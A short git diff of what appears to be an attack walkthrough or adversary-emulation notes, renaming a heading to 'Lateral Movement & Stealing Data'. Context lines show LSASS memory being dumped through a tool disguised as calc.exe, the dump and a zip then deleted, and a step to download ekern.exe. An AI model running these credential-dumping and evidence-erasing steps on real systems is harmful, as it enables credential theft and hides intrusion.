@@ -45,7 +45,8 @@ lsass.exe                      652 Services                   0     16,848 K
 #### k. `C:\windows\temp\calc.exe -accepteula -ma 652 C:\Windows\Temp\logct2.dmp`
 #### l. Delete both of them `Remove-Item -Path "C:\Windows\Temp\logct2.dmp", "C:\Windows\Temp\logctl.zip"`
 
-### - Part 2: Lateral Movement
+### - Part 2: Lateral Movement & Stealing Data
+
 
 #### a. Download ekern.exe 
 ```
